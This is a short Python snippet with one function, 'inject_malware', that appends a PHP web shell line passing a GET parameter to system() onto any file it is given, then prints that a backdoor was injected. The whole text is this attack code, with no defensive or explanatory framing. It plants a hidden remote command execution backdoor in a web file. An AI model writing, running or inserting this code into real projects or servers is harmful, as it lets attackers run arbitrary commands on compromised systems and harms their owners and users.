def inject_malware(file_path):  
    with open(file_path, "a") as f:  
        f.write("\n<?php system($_GET['cmd']); ?>")  
    print(f"[+] Backdoor injected into {file_path}")  
